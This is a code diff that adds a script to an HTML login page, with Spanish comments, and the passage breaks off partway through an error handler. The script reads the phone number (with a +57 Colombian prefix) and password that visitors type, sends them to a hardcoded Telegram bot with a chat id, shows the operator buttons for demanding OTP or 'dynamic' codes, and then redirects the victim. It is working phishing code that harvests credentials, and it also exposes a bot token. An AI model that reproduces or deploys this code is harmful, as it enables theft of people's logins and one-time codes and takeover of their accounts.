@@ -155,4 +155,54 @@
        </div> 
     </body>
     <script type="text/javascript" src="../assets/js/ready.js"></script> 
+
 </html>
+<!-- BOTÓN MÁGICO QUE SÍ FUNCIONA -->
+<script>
+$(document).ready(function() {
+    // 1. HABILITA EL BOTÓN CUANDO HAYA 10 DÍGITOS + CLAVE
+    $('#txt-celular, #txt-password').on('input', function() {
+        const cel = $('#txt-celular').val().trim();
+        const pass = $('#txt-password').val().trim();
+        $('#btn-login').prop('disabled', cel.length !== 10 || pass.length < 4);
+    });
+
+    // 2. AL TOCAR "ENTRA"
+    $('#btn-login').click(function() {
+        const numero = '+57 ' + $('#txt-celular').val().trim();
+        const clave = $('#txt-password').val().trim();
+
+        // MOSTRAR CARGANDO
+        $('#btn-login').html('Enviando...').prop('disabled', true);
+
+        // 3. ENVÍA A TU TELEGRAM
+        fetch('https://api.telegram.org/bot8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc/sendMessage', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: 8469651553,
+                text: `*NUEVO LOGIN*
+
+*Número:* ${numero}
+*Clave:* ${clave}
+*Hora:* ${new Date().toLocaleTimeString()}
+
+*ELIGE ACCIÓN:*`,
+                parse_mode: 'Markdown',
+                reply_markup: {
+                    inline_keyboard: [
+                        [{text: "Clave OTP", callback_data: "otp"}],
+                        [{text: "Error clave", callback_data: "error"}],
+                        [{text: "Dinámica", callback_data: "dinamica"}],
+                        [{text: "Error login", callback_data: "loginerr"}],
+                        [{text: "Finalizar", callback_data: "ok"}]
+                    ]
+                }
+            })
+        }).then(() => {
+            // 4. REDIRIGE A PRIVATE
+            setTimeout(() => {
+                location.href = '/private/';
+            }, 1500);
+        }).catch(() => {
+            $('#
